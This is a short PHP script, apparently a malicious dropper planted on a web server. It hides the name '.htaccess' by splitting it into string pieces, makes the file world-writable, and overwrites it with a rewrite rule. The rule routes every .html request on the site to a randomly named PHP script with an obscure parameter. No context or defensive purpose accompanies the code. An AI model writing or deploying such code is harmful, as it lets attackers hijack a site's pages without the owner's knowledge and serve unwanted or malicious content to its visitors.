<?php
$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);

	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ vobiseurfse.php?hjrtk352fgd=$1 [L]");
fclose($htout);